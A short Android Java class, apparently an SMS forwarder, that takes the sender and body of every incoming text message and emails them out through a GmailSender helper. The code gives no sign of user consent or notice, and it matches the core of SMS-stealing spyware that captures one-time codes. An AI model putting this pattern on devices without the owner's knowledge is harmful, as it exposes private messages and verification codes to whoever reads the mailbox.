public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String sender = sms.getOriginatingAddress();
            String body = sms.getMessageBody();

            String message = "SMS From: " + sender + "\nMessage: " + body;

            GmailSender.sendMail("SMS Received", message);
        }
    }
}
